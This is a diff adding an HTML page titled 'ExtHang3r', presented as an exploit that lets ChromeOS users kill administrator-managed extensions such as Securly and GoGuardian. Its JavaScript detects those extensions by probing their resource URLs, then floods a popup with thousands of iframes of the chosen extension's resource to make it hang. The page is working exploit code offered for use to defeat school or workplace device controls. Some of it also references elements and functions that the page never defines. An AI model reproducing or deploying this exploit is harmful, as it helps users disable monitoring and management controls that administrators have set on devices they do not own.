@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ExtHang3r</title>
+  <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/main/favicon.png">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
+  
+  <style>
+    body {
+      font-family: 'Varela Round', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f8f9fa;
+      color: #333;
+    }
+    
+    header {
+      background-color: #343a40;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin-right: 10px;
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 150px auto 0 auto;
+      padding: 20px;
+      text-align: center;
+      background: #fff;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+    
+    select, button {
+      font-family: 'Varela Round', sans-serif;
+      padding: 10px;
+      font-size: 16px;
+      margin-top: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    
+    select {
+      width: 100%;
+      border: 1px solid #ced4da;
+    }
+    
+    button {
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+    }
+    
+    button:hover {
+      background-color: #0056b3;
+    }
+    
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      color: #fff;
+      font-size: 24px;
+      user-select: none;
+      flex-direction: column;
+    }
+    
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    footer {
+      background-color: #343a40;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+    
+    footer a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <img src="https://blobby-boi.github.io/BlobbypassXSS/favicon.png" alt="Logo" class="logo">
+    <h1>ExtHang3r</h1>
+  </header>
+
+  <div class="container">
+    <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of September 2024.</p>
+    <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
+    <select id="iframeSelect"></select>
+    <button onclick="warning();" id="hangButton">Hang Extension!</button>
+    <button id="killButton" onclick="openExtensionPopup();" style="display:none;">Kill Extension!</button>
+  </div>
+
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Hanging... (This will take about 1 minute)
+  </div>
+
+  <footer>
+    <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a></p>
+  </footer>
+
+  <script>
+    async function checkExtensionURL(url) {
+      try {
+        const response = await fetch(url);
+        return response.ok;
+      } catch (error) {
+        return false;
+      }
+    }
+
+    async function populateSelectOptions() {
+      const selectElement = document.getElementById("iframeSelect");
+      const extensions = {
+        "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+        "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+        // Add other extensions...
+      };
+
+      let hasSupportedExtensions = false;
+      for (const [name, url] of Object.entries(extensions)) {
+        if (await checkExtensionURL(url)) {
+          const option = document.createElement("option");
+          option.value = url;
+          option.textContent = name;
+          selectElement.appendChild(option);
+          hasSupportedExtensions = true;
+        }
+      }
+
+      if (!hasSupportedExtensions) {
+        const option = document.createElement("option");
+        option.value = "";
+        option.textContent = "No supported extensions installed";
+        selectElement.appendChild(option);
+        document.getElementById("hangButton").style.display = "none";
+      }
+    }
+
+    populateSelectOptions();
+
+    function replaceIframes(container, iframeSrc) {
+      for (var i = 0; i < 1000; i++) {
+        var iframe = document.createElement('iframe');
+        iframe.src = iframeSrc;
+        iframe.style.width = '100%';
+        iframe.style.height = '100px';
+        container.appendChild(iframe);
+      }
+      setTimeout(function() {
+        while (container.firstChild) {
+          container.removeChild(container.firstChild);
+        }
+        replaceIframes(container, iframeSrc);
+      }, 5000);
+    }
+
+    function warning() {
+      var overlay = document.getElementById("overlay");
+      overlay.style.display = "flex";
+      var iframeSelect = document.getElementById("iframeSelect");
+      var selectedSrc = iframeSelect.value;
+
+      var popup = window.open("", "PopupWindow", "width=100,height=100");
+      var popupBody = popup.document.body;
+      var iframeContainer = document.createElement('div');
+      iframeContainer.id = 'iframeContainer';
+      popupBody.appendChild(iframeContainer);
+
+      replaceIframes(iframeContainer, selectedSrc);
+
+      setTimeout(function() {
+        popup.close();
+        var killExtensionText = document.getElementById("killExtensionText");
+        killExtensionText.innerHTML = "Now that the extension has been hanged, press the button above.";
+        overlay.style.display = "none";
+      }, 60000); // After 1 minute
+    }
+  </script>
+</body>
+</html>
